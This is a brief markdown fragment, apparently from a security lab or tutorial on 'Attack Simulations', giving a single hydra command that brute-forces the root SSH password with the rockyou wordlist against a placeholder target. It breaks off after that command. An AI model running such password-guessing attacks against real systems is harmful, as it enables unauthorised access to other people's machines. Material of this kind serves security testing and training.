## Attack Simulations  
### 1. Brute-Force SSH Attack  
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>